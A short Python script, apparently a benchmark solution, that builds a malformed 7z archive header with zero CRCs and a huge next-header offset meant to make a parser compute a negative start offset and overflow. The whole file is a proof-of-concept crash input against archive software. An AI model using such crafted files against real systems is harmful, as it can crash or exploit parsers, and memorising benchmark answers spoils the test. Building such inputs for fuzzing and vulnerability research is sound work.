import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        # 7z header crafted to produce a negative archive start offset
        signature = b"\x37\x7A\xBC\xAF\x27\x1C"  # 7z signature
        version = b"\x00\x04"  # Version
        start_header_crc = b"\x00\x00\x00\x00"

        # Large next header offset to cause calculations to underflow/overflow
        next_header_offset = (0xFFFFFFFFFFFFFFE0).to_bytes(8, "little", signed=False)
        next_header_size = (0x0000000000000010).to_bytes(8, "little", signed=False)
        next_header_crc = b"\x00\x00\x00\x00"

        header = (
            signature
            + version
            + start_header_crc
            + next_header_offset
            + next_header_size
            + next_header_crc
        )

        padding_length = 46 - len(header)
        if padding_length < 0:
            padding_length = 0
        padding = b"\x00" * padding_length

        return header + padding